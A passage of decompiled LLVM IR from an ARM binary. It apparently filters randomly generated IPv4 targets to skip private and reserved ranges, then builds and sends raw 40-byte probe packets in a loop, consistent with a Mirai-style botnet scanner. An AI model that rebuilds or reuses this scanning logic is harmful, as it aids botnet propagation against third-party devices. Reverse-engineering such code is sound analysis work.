dec_label_pc_fef8:                                ; preds = %dec_label_pc_fef0
  %v1_fef8 = add nsw i32 %v1_fecc, -15
  store i32 %v1_fef8, i32* %r3.global-to-local, align 4
  %v2_fefc = icmp ugt i32 %v1_fecc, 55
  store i1 %v2_fefc, i1* %cpsr_c.global-to-local, align 1
  %v7_fefc = icmp eq i32 %v1_fecc, 56
  store i1 %v7_fefc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fefc, label %dec_label_pc_fec8, label %bb301

bb301:                                            ; preds = %dec_label_pc_fef8
  %v3_ff00 = icmp ne i32 %v1_fef8, 0
  store i1 %v3_ff00, i1* %cpsr_c.global-to-local, align 1
  %v8_ff00 = icmp eq i32 %v1_fef8, 1
  store i1 %v8_ff00, i1* %cpsr_z.global-to-local, align 1
  %v2_ff04 = xor i1 %v3_ff00, true
  %v3_ff04 = or i1 %v8_ff00, %v2_ff04
  br i1 %v3_ff04, label %dec_label_pc_fec8, label %dec_label_pc_ff08

dec_label_pc_ff08:                                ; preds = %bb301
  %v2_ff08 = icmp ugt i32 %v1_fecc, 9
  store i1 %v2_ff08, i1* %cpsr_c.global-to-local, align 1
  %v7_ff08 = icmp eq i32 %v1_fecc, 10
  store i1 %v7_ff08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff08, label %dec_label_pc_fec8, label %dec_label_pc_ff10

dec_label_pc_ff10:                                ; preds = %dec_label_pc_ff08
  %v2_ff10 = icmp ugt i32 %v1_fecc, 191
  store i1 %v2_ff10, i1* %cpsr_c.global-to-local, align 1
  %v7_ff10 = icmp eq i32 %v1_fecc, 192
  store i1 %v7_ff10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff10, label %bb302, label %dec_label_pc_ff1c

bb302:                                            ; preds = %dec_label_pc_ff10
  %v3_ff14 = icmp ugt i32 %v1_fee0, 167
  store i1 %v3_ff14, i1* %cpsr_c.global-to-local, align 1
  %v8_ff14 = icmp eq i32 %v1_fee0, 168
  store i1 %v8_ff14, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ff14, label %dec_label_pc_fec8, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ff10, %bb302
  %v7_ff1c = icmp eq i32 %v1_fecc, 172
  %.381 = zext i1 %v7_ff1c to i32
  store i32 %.381, i32* %r3.global-to-local, align 4
  %v2_ff28 = icmp ugt i32 %v1_fee0, 14
  store i1 %v2_ff28, i1* %cpsr_c.global-to-local, align 1
  %v7_ff28 = icmp eq i32 %v1_fee0, 15
  store i1 %v7_ff28, i1* %cpsr_z.global-to-local, align 1
  %v2_ff2c = xor i1 %v2_ff28, true
  %v3_ff2c = or i1 %v7_ff28, %v2_ff2c
  br i1 %v3_ff2c, label %.thread13, label %bb305

.thread13:                                        ; preds = %dec_label_pc_ff1c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff40

bb305:                                            ; preds = %dec_label_pc_ff1c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff30 = icmp eq i1 %v7_ff1c, false
  store i1 %v2_ff30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff30, label %dec_label_pc_ff40, label %dec_label_pc_ff38

dec_label_pc_ff38:                                ; preds = %bb305
  %v2_ff38 = icmp ugt i32 %v1_fee0, 30
  store i1 %v2_ff38, i1* %cpsr_c.global-to-local, align 1
  %v7_ff38 = icmp eq i32 %v1_fee0, 31
  store i1 %v7_ff38, i1* %cpsr_z.global-to-local, align 1
  %v2_ff3c = xor i1 %v2_ff38, true
  %v3_ff3c = or i1 %v7_ff38, %v2_ff3c
  br i1 %v3_ff3c, label %dec_label_pc_fec8, label %dec_label_pc_ff40

dec_label_pc_ff40:                                ; preds = %.thread13, %dec_label_pc_ff38, %bb305
  %v7_ff40 = icmp eq i32 %v1_fecc, 100
  %.382 = zext i1 %v7_ff40 to i32
  store i32 %.382, i32* %r3.global-to-local, align 4
  %v2_ff4c = icmp ugt i32 %v1_fee0, 62
  store i1 %v2_ff4c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff4c = icmp eq i32 %v1_fee0, 63
  store i1 %v7_ff4c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff50 = xor i1 %v2_ff4c, true
  %v3_ff50 = or i1 %v7_ff4c, %v2_ff50
  br i1 %v3_ff50, label %.thread18, label %bb308

.thread18:                                        ; preds = %dec_label_pc_ff40
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff64

bb308:                                            ; preds = %dec_label_pc_ff40
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff54 = icmp eq i1 %v7_ff40, false
  store i1 %v2_ff54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff54, label %dec_label_pc_ff64, label %dec_label_pc_ff5c

dec_label_pc_ff5c:                                ; preds = %bb308
  %v2_ff5c = icmp ugt i32 %v1_fee0, 125
  store i1 %v2_ff5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff5c = icmp eq i32 %v1_fee0, 126
  store i1 %v7_ff5c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff60 = xor i1 %v2_ff5c, true
  %v3_ff60 = or i1 %v7_ff5c, %v2_ff60
  br i1 %v3_ff60, label %dec_label_pc_fec8, label %dec_label_pc_ff64

dec_label_pc_ff64:                                ; preds = %.thread18, %dec_label_pc_ff5c, %bb308
  %v2_ff64 = icmp ugt i32 %v1_fecc, 168
  store i1 %v2_ff64, i1* %cpsr_c.global-to-local, align 1
  %v7_ff64 = icmp eq i32 %v1_fecc, 169
  store i1 %v7_ff64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff64, label %bb309, label %dec_label_pc_ff70

bb309:                                            ; preds = %dec_label_pc_ff64
  %v3_ff68 = icmp eq i32 %v1_fee0, 255
  store i1 %v3_ff68, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_ff68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_ff68, label %dec_label_pc_fec8, label %dec_label_pc_ff70

dec_label_pc_ff70:                                ; preds = %dec_label_pc_ff64, %bb309
  %v7_ff70 = icmp eq i32 %v1_fecc, 198
  %.383 = zext i1 %v7_ff70 to i32
  store i32 %.383, i32* %r3.global-to-local, align 4
  %v2_ff7c = icmp ugt i32 %v1_fee0, 16
  store i1 %v2_ff7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff7c = icmp eq i32 %v1_fee0, 17
  store i1 %v7_ff7c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff80 = xor i1 %v2_ff7c, true
  %v3_ff80 = or i1 %v7_ff7c, %v2_ff80
  br i1 %v3_ff80, label %.thread24, label %bb312

.thread24:                                        ; preds = %dec_label_pc_ff70
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ff94

bb312:                                            ; preds = %dec_label_pc_ff70
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff84 = icmp eq i1 %v7_ff70, false
  store i1 %v2_ff84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ff84, label %dec_label_pc_ff94, label %dec_label_pc_ff8c

dec_label_pc_ff8c:                                ; preds = %bb312
  %v2_ff8c = icmp ugt i32 %v1_fee0, 18
  store i1 %v2_ff8c, i1* %cpsr_c.global-to-local, align 1
  %v7_ff8c = icmp eq i32 %v1_fee0, 19
  store i1 %v7_ff8c, i1* %cpsr_z.global-to-local, align 1
  %v2_ff90 = xor i1 %v2_ff8c, true
  %v3_ff90 = or i1 %v7_ff8c, %v2_ff90
  br i1 %v3_ff90, label %dec_label_pc_fec8, label %dec_label_pc_ff94

dec_label_pc_ff94:                                ; preds = %.thread24, %dec_label_pc_ff8c, %bb312
  %v2_ff94 = icmp ugt i32 %v1_fecc, 222
  store i1 %v2_ff94, i1* %cpsr_c.global-to-local, align 1
  %v7_ff94 = icmp eq i32 %v1_fecc, 223
  store i1 %v7_ff94, i1* %cpsr_z.global-to-local, align 1
  %v2_ff98 = xor i1 %v7_ff94, true
  %v3_ff98 = and i1 %v2_ff94, %v2_ff98
  br i1 %v3_ff98, label %dec_label_pc_fec8, label %dec_label_pc_ff9c

dec_label_pc_ff9c:                                ; preds = %dec_label_pc_ff94
  %v7_ff9c = icmp eq i32 %v1_fecc, 106
  %.384 = zext i1 %v7_ff9c to i32
  store i32 %.384, i32* %lr.global-to-local, align 4
  %v2_ffa8 = icmp ugt i32 %v1_fee0, 185
  store i1 %v2_ffa8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffa8 = icmp eq i32 %v1_fee0, 186
  store i1 %v7_ffa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffa8, label %bb315, label %dec_label_pc_ffb4

bb315:                                            ; preds = %dec_label_pc_ff9c
  %v2_ff9c = icmp ugt i32 %v1_fecc, 105
  store i1 %v2_ff9c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ff9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ff9c, label %dec_label_pc_fec8, label %dec_label_pc_ffb4.thread

dec_label_pc_ffb4.thread:                         ; preds = %bb315
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffc8

dec_label_pc_ffb4:                                ; preds = %dec_label_pc_ff9c
  %v2_ffb4 = icmp ugt i32 %v1_fee0, 186
  store i1 %v2_ffb4, i1* %cpsr_c.global-to-local, align 1
  %v7_ffb4 = icmp eq i32 %v1_fee0, 187
  store i1 %v7_ffb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffb4, label %.thread29, label %dec_label_pc_ffc8

.thread29:                                        ; preds = %dec_label_pc_ffb4
  store i32 %.384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffc0 = icmp eq i1 %v7_ff9c, false
  store i1 %v2_ffc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffc0, label %dec_label_pc_ffc8.thread, label %dec_label_pc_fec8

dec_label_pc_ffc8.thread:                         ; preds = %.thread29
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ffdc

dec_label_pc_ffc8:                                ; preds = %dec_label_pc_ffb4, %dec_label_pc_ffb4.thread
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ffc8 = icmp ugt i32 %v1_fee0, 184
  store i1 %v2_ffc8, i1* %cpsr_c.global-to-local, align 1
  %v7_ffc8 = icmp eq i32 %v1_fee0, 185
  store i1 %v7_ffc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffc8, label %.thread33, label %dec_label_pc_ffdc

.thread33:                                        ; preds = %dec_label_pc_ffc8
  store i32 %.384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffd4 = icmp eq i1 %v7_ff9c, false
  store i1 %v2_ffd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffd4, label %dec_label_pc_ffdc.thread, label %dec_label_pc_fec8

dec_label_pc_ffdc.thread:                         ; preds = %.thread33
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %.thread38

dec_label_pc_ffdc:                                ; preds = %dec_label_pc_ffc8, %dec_label_pc_ffc8.thread
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_ffdc = icmp ugt i32 %v1_fee0, 183
  store i1 %v2_ffdc, i1* %cpsr_c.global-to-local, align 1
  %v7_ffdc = icmp eq i32 %v1_fee0, 184
  store i1 %v7_ffdc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ffdc, label %.thread37, label %.thread38

.thread38:                                        ; preds = %dec_label_pc_ffdc.thread, %dec_label_pc_ffdc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_fff0

.thread37:                                        ; preds = %dec_label_pc_ffdc
  store i32 %.384, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ffe8 = icmp eq i1 %v7_ff9c, false
  store i1 %v2_ffe8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ffe8, label %dec_label_pc_fff0, label %dec_label_pc_fec8

dec_label_pc_fff0:                                ; preds = %.thread38, %.thread37
  %v2_fff0 = icmp ugt i32 %v1_fecc, 149
  store i1 %v2_fff0, i1* %cpsr_c.global-to-local, align 1
  %v7_fff0 = icmp eq i32 %v1_fecc, 150
  store i1 %v7_fff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fff0, label %bb316, label %dec_label_pc_fffc

bb316:                                            ; preds = %dec_label_pc_fff0
  %v3_fff4 = icmp ugt i32 %v1_fee0, 30
  store i1 %v3_fff4, i1* %cpsr_c.global-to-local, align 1
  %v8_fff4 = icmp eq i32 %v1_fee0, 31
  store i1 %v8_fff4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fff4, label %dec_label_pc_fec8, label %dec_label_pc_fffc.thread

dec_label_pc_fffc.thread:                         ; preds = %bb316
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10008.thread

dec_label_pc_fffc:                                ; preds = %dec_label_pc_fff0
  %v2_fffc = icmp ugt i32 %v1_fecc, 48
  store i1 %v2_fffc, i1* %cpsr_c.global-to-local, align 1
  %v7_fffc = icmp eq i32 %v1_fecc, 49
  store i1 %v7_fffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fffc, label %bb317, label %dec_label_pc_10008

bb317:                                            ; preds = %dec_label_pc_fffc
  %v3_10000 = icmp ugt i32 %v1_fee0, 50
  store i1 %v3_10000, i1* %cpsr_c.global-to-local, align 1
  %v8_10000 = icmp eq i32 %v1_fee0, 51
  store i1 %v8_10000, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10000, label %dec_label_pc_fec8, label %dec_label_pc_10008.thread

dec_label_pc_10008.thread:                        ; preds = %dec_label_pc_fffc.thread, %bb317
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10014.thread

dec_label_pc_10008:                               ; preds = %dec_label_pc_fffc
  %v2_10008 = icmp ugt i32 %v1_fecc, 177
  store i1 %v2_10008, i1* %cpsr_c.global-to-local, align 1
  %v7_10008 = icmp eq i32 %v1_fecc, 178
  store i1 %v7_10008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10008, label %bb318, label %dec_label_pc_10014

bb318:                                            ; preds = %dec_label_pc_10008
  %v3_1000c = icmp ugt i32 %v1_fee0, 61
  store i1 %v3_1000c, i1* %cpsr_c.global-to-local, align 1
  %v8_1000c = icmp eq i32 %v1_fee0, 62
  store i1 %v8_1000c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1000c, label %dec_label_pc_fec8, label %dec_label_pc_10014.thread

dec_label_pc_10014.thread:                        ; preds = %dec_label_pc_10008.thread, %bb318
  %v2_10014396 = icmp ugt i32 %v1_fecc, 159
  store i1 %v2_10014396, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_10020.thread

dec_label_pc_10014:                               ; preds = %dec_label_pc_10008
  %v2_10014 = icmp ugt i32 %v1_fecc, 159
  store i1 %v2_10014, i1* %cpsr_c.global-to-local, align 1
  %v7_10014 = icmp eq i32 %v1_fecc, 160
  store i1 %v7_10014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10014, label %bb319, label %dec_label_pc_10020

bb319:                                            ; preds = %dec_label_pc_10014
  %v3_10018 = icmp ugt i32 %v1_fee0, 12
  store i1 %v3_10018, i1* %cpsr_c.global-to-local, align 1
  %v8_10018 = icmp eq i32 %v1_fee0, 13
  store i1 %v8_10018, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10018, label %dec_label_pc_fec8, label %dec_label_pc_10020.thread

dec_label_pc_10020.thread:                        ; preds = %dec_label_pc_10014.thread, %bb319
  %v1_10020398 = add nsw i32 %v1_fecc, -6
  store i32 %v1_10020398, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %bb320

dec_label_pc_10020:                               ; preds = %dec_label_pc_10014
  %v1_10020 = add nsw i32 %v1_fecc, -6
  store i32 %v1_10020, i32* %r3.global-to-local, align 4
  %v2_10024 = icmp ugt i32 %v1_fecc, 10
  store i1 %v2_10024, i1* %cpsr_c.global-to-local, align 1
  %v7_10024 = icmp eq i32 %v1_fecc, 11
  store i1 %v7_10024, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10024, label %dec_label_pc_fec8, label %bb320

bb320:                                            ; preds = %dec_label_pc_10020.thread, %dec_label_pc_10020
  %v1_10020401 = phi i32 [ %v1_10020398, %dec_label_pc_10020.thread ], [ %v1_10020, %dec_label_pc_10020 ]
  %v3_10028 = icmp ne i32 %v1_10020401, 0
  store i1 %v3_10028, i1* %cpsr_c.global-to-local, align 1
  %v8_10028 = icmp eq i32 %v1_10020401, 1
  store i1 %v8_10028, i1* %cpsr_z.global-to-local, align 1
  %v2_1002c = xor i1 %v3_10028, true
  %v3_1002c = or i1 %v8_10028, %v2_1002c
  br i1 %v3_1002c, label %dec_label_pc_fec8, label %dec_label_pc_10030

dec_label_pc_10030:                               ; preds = %bb320
  %v2_10030 = icmp ugt i32 %v1_fecc, 21
  store i1 %v2_10030, i1* %cpsr_c.global-to-local, align 1
  %v7_10030 = icmp eq i32 %v1_fecc, 22
  store i1 %v7_10030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10030, label %dec_label_pc_fec8, label %bb321

bb321:                                            ; preds = %dec_label_pc_10030
  %v3_10034 = icmp ugt i32 %v1_fecc, 20
  store i1 %v3_10034, i1* %cpsr_c.global-to-local, align 1
  %v8_10034 = icmp eq i32 %v1_fecc, 21
  store i1 %v8_10034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10034, label %dec_label_pc_fec8, label %dec_label_pc_1003c

dec_label_pc_1003c:                               ; preds = %bb321
  %v2_1003c = icmp ugt i32 %v1_fecc, 27
  store i1 %v2_1003c, i1* %cpsr_c.global-to-local, align 1
  %v7_1003c = icmp eq i32 %v1_fecc, 28
  store i1 %v7_1003c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1003c, label %dec_label_pc_fec8, label %bb322

bb322:                                            ; preds = %dec_label_pc_1003c
  %v3_10040 = icmp ugt i32 %v1_fecc, 25
  store i1 %v3_10040, i1* %cpsr_c.global-to-local, align 1
  %v8_10040 = icmp eq i32 %v1_fecc, 26
  store i1 %v8_10040, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10040, label %dec_label_pc_fec8, label %dec_label_pc_10048

dec_label_pc_10048:                               ; preds = %bb322
  %v2_10048 = icmp ugt i32 %v1_fecc, 29
  store i1 %v2_10048, i1* %cpsr_c.global-to-local, align 1
  %v7_10048 = icmp eq i32 %v1_fecc, 30
  store i1 %v7_10048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10048, label %dec_label_pc_fec8, label %bb323

bb323:                                            ; preds = %dec_label_pc_10048
  %v3_1004c = icmp ugt i32 %v1_fecc, 28
  store i1 %v3_1004c, i1* %cpsr_c.global-to-local, align 1
  %v8_1004c = icmp eq i32 %v1_fecc, 29
  store i1 %v8_1004c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1004c, label %dec_label_pc_fec8, label %dec_label_pc_10054

dec_label_pc_10054:                               ; preds = %bb323
  %v2_10054 = icmp ugt i32 %v1_fecc, 54
  store i1 %v2_10054, i1* %cpsr_c.global-to-local, align 1
  %v7_10054 = icmp eq i32 %v1_fecc, 55
  store i1 %v7_10054, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10054, label %dec_label_pc_fec8, label %bb324

bb324:                                            ; preds = %dec_label_pc_10054
  %v3_10058 = icmp ugt i32 %v1_fecc, 32
  store i1 %v3_10058, i1* %cpsr_c.global-to-local, align 1
  %v8_10058 = icmp eq i32 %v1_fecc, 33
  store i1 %v8_10058, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10058, label %dec_label_pc_fec8, label %dec_label_pc_10060

dec_label_pc_10060:                               ; preds = %bb324
  %v2_10060 = icmp ugt i32 %v1_fecc, 214
  store i1 %v2_10060, i1* %cpsr_c.global-to-local, align 1
  %v7_10060 = icmp eq i32 %v1_fecc, 215
  store i1 %v7_10060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10060, label %.thread53, label %bb325

bb325:                                            ; preds = %dec_label_pc_10060
  %v3_10064 = icmp ugt i32 %v1_fecc, 213
  store i1 %v3_10064, i1* %cpsr_c.global-to-local, align 1
  %v8_10064 = icmp eq i32 %v1_fecc, 214
  store i1 %v8_10064, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10064, label %bb326, label %dec_label_pc_10074

.thread53:                                        ; preds = %dec_label_pc_10060
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fec8

bb326:                                            ; preds = %bb325
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_fec8

dec_label_pc_10074:                               ; preds = %bb325
  store i32 0, i32* @r4, align 4
  %v5_10080 = call i32 @llvm.bswap.i32(i32 %v0_fec8)
  store i32 %v5_10080, i32* %r3.global-to-local, align 4
  %tmp327 = and i32 %v0_fec8, 65280
  %tmp328 = call i32 @llvm.bswap.i32(i32 %tmp327)
  %tmp329 = and i32 %v0_fec8, 16711680
  %tmp330 = call i32 @llvm.bswap.i32(i32 %tmp329)
  %v3_1008c = mul nuw i32 %v3_fee8, 16777216
  %v3_10090 = udiv i32 %tmp328, 256
  %v4_10094 = mul nuw nsw i32 %tmp330, 256
  %tmp331 = and i32 %v0_fec8, 32768
  %v3_10098 = icmp ne i32 %tmp331, 0
  store i1 %v3_10098, i1* %cpsr_c.global-to-local, align 1
  %v4_10098 = udiv i32 %v5_10080, 16777216
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* @r0, align 4
  %v5_10098 = or i32 %v4_10098, %v3_1008c
  %v5_10094 = or i32 %v5_10098, %v4_10094
  %v2_100a0 = or i32 %v5_10094, %v3_10090
  store i32 %v2_100a0, i32* %r2.global-to-local, align 4
  %v4_100a4 = trunc i32 %v4_10098 to i8
  store i8 %v4_100a4, i8* @global_var_1a3fc.246, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  store i8 0, i8* bitcast (i32* @global_var_1a3f6.247 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_1a3f7.248 to i8*), align 4
  %v2_100b4 = call i32 @function_ddf4(i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32 20)
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %ip.global-to-local, align 4
  %sext9 = mul i32 %v2_100b4, 16777216
  %v1_100bc = sdiv i32 %sext9, 16777216
  store i32 %v1_100bc, i32* %r3.global-to-local, align 4
  %v4_100c0 = ashr i32 %sext9, 31
  store i32 %v4_100c0, i32* %r2.global-to-local, align 4
  %v1_100c4 = trunc i32 %v1_100bc to i8
  store i8 %v1_100c4, i8* bitcast (i32* @global_var_1a3f6.247 to i8*), align 4
  %v1_100c8 = trunc i32 %v4_100c0 to i8
  store i8 %v1_100c8, i8* bitcast (i32* @global_var_1a3f7.248 to i8*), align 4
  %v3_100cc = load i32, i32* %stack_var_-52, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_100d4 = srem i32 %v3_100cc, 10
  store i32 %v2_100d4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_100d8 = icmp eq i32 %v2_100d4, 0
  store i1 %v2_100d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_100d8, label %.thread232, label %bb332

.thread232:                                       ; preds = %dec_label_pc_10074
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* %lr.global-to-local, align 4
  br label %.thread63.thread106

bb332:                                            ; preds = %dec_label_pc_10074
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* %r0.global-to-local, align 4
  store i32 23, i32* %r3.global-to-local, align 4
  %v1_100e8 = load i32, i32* @r4, align 4
  %v2_100e8 = trunc i32 %v1_100e8 to i8
  store i8 %v2_100e8, i8* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32 2) to i8*), align 2
  %v0_100ec.pr.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_100ec.pr.pre, label %.thread63.thread106, label %.thread60

.thread60:                                        ; preds = %bb332
  %v1_100ec = load i32, i32* %r3.global-to-local, align 4
  %v2_100ec = trunc i32 %v1_100ec to i8
  %v3_100ec = load i32, i32* %r0.global-to-local, align 4
  %v4_100ec = add i32 %v3_100ec, 3
  %v5_100ec = inttoptr i32 %v4_100ec to i8*
  store i8 %v2_100ec, i8* %v5_100ec, align 1
  %v0_100f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %r0.global-to-local, align 4
  br i1 %v0_100f4.pr.pr, label %.thread66, label %.thread68

.thread63.thread106:                              ; preds = %bb332, %.thread232
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %r0.global-to-local, align 4
  br label %.thread66

.thread66:                                        ; preds = %.thread60, %.thread63.thread106
  store i32 9, i32* %r3.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v3_100fc = load i32, i32* %lr.global-to-local, align 4
  %v4_100fc = add i32 %v3_100fc, 2
  %v5_100fc = inttoptr i32 %v4_100fc to i8*
  store i8 9, i8* %v5_100fc, align 1
  %v0_10100.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10100.pr.pr, label %bb333, label %.thread68

bb333:                                            ; preds = %.thread66
  %v1_10100 = load i32, i32* %r2.global-to-local, align 4
  %v2_10100 = trunc i32 %v1_10100 to i8
  %v3_10100 = load i32, i32* %lr.global-to-local, align 4
  %v4_10100 = add i32 %v3_10100, 3
  %v5_10100 = inttoptr i32 %v4_10100 to i8*
  store i8 %v2_10100, i8* %v5_10100, align 1
  br label %.thread68

.thread68:                                        ; preds = %.thread60, %.thread66, %bb333
  %v3_10104 = load i8, i8* @global_var_1a3fc.246, align 1
  %v4_10104 = sext i8 %v3_10104 to i32
  store i32 %v4_10104, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* %lr.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* @r1, align 4
  store i8 %v3_10104, i8* @global_var_1a404.249, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v0_1011c = load i32, i32* %sl.global-to-local, align 4
  %v1_1011c = trunc i32 %v0_1011c to i8
  store i8 %v1_1011c, i8* bitcast (i32* @global_var_1a410.250 to i8*), align 4
  store i8 %v1_1011c, i8* bitcast (i32* @global_var_1a411.251 to i8*), align 4
  %v4_10124 = call i32 @function_de50(i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32 5120, i32 20)
  %sext = mul i32 %v4_10124, 16777216
  %v1_1012c = sdiv i32 %sext, 16777216
  %v3_10134 = ashr i32 %sext, 31
  %v2_10138 = load i32, i32* @global_var_1a400.203, align 4
  %v1_10140 = trunc i32 %v3_10134 to i8
  store i8 %v1_10140, i8* bitcast (i32* @global_var_1a411.251 to i8*), align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_10154 = load i8, i8* @global_var_1a3fc.246, align 1
  %v4_10154 = sext i8 %v3_10154 to i32
  store i32 %v4_10154, i32* %r4.global-to-local, align 4
  %v2_10158 = load i32, i32* @global_var_1a440.197, align 4
  store i32 %v2_10158, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a400.203 to i32), i32* %ip.global-to-local, align 4
  %v1_10168 = and i32 %v2_10138, 8388608
  %v2_10168 = icmp ne i32 %v1_10168, 0
  store i1 %v2_10168, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_1a3ec.199 to i32), i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v1_1017c = trunc i32 %v1_1012c to i8
  store i8 %v1_1017c, i8* bitcast (i32* @global_var_1a410.250 to i8*), align 4
  store i32 %v2_10184, i32* %lr.global-to-local, align 4
  %v9_10194 = call i32 @sendto(i32 %v2_10158, i32* nonnull @global_var_1a3ec.199, i32 40, i32 16384, %sockaddr* %tmp298, i32 16)
  store i32 %v9_10194, i32* %r0.global-to-local, align 4
  %v3_10198 = load i32, i32* %stack_var_-52, align 4
  %v1_1019c = add i32 %v3_10198, 1
  store i32 %v1_1019c, i32* %r3.global-to-local, align 4
  %v3_101a0 = icmp ugt i32 %v1_1019c, 383
  store i1 %v3_101a0, i1* %cpsr_c.global-to-local, align 1
  %v8_101a0 = icmp eq i32 %v1_1019c, 384
